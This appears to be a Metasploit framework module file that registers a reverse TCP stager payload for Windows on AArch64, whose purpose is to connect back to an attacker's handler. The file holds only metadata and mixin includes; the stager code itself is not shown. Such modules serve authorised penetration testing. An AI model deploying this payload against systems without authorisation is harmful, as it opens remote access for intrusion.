# frozen_string_literal: true

##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

module MetasploitModule
  CachedSize = 716

  include Msf::Payload::Stager
  include Msf::Payload::Windows::ReverseTcp_Aarch64

  def initialize(info = {})
    super(
      merge_info(
        info,
        'Name' => 'Windows AArch64 Reverse TCP Stager',
        'Description' => 'Connect back to the attacker (Windows AArch64)',
        'Author' => [ 'vinicius-batistella' ],
        'License' => MSF_LICENSE,
        'Platform' => 'win',
        'Arch' => ARCH_AARCH64,
        'Handler' => Msf::Handler::ReverseTcp,
        'Convention' => 'sockx0',
        'Stager' => { 'RequiresMidstager' => false }
      )
    )
  end
end
